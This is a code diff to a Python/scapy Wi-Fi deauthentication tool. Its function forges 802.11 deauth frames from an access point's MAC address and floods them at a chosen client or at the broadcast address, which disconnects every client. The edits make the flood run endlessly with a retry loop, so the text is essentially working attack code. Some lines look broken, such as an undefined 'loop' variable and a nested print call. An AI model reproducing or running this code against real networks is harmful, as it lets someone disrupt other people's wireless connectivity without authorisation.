@@ -10,7 +10,7 @@ def deauth(target_mac, gateway_mac, iface, default_iface = ''):
     # addr3: Access Point MAC
 
     count=0
-    inter=0.00001
+    inter=0.01
 
     # If not sudo, don't allow to continue
     if not 'SUDO_UID' in os.environ.keys():
@@ -28,7 +28,7 @@ def deauth(target_mac, gateway_mac, iface, default_iface = ''):
         if target_mac.lower() == 'a':
             target_mac = 'ff:ff:ff:ff:ff:ff'
         
-        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+        dot11 = Dot11(type=8, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) ###
 
         if default_iface != '':
             iface = default_iface
@@ -43,9 +43,17 @@ def deauth(target_mac, gateway_mac, iface, default_iface = ''):
                 print(f"[{Fore.YELLOW}?{Style.RESET_ALL}] Sending frames every {inter}s until CTRL-C is pressed...")
 
             # Stack them up
-            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-            # Send the packet
-            sendp(packet, count=count, loop=1, iface=iface, verbose=0)
+            packet = RadioTap()/dot11/Dot11Deauth() ### 
+
+            while True:
+                try:
+                    # Send the packet
+                    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=1) ###
+                except Exception as e:
+                    print(print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}'))
+                except KeyboardInterrupt:
+                    sys.exit()
+                    break
         
         else:
             print('Operation was cancelled.')
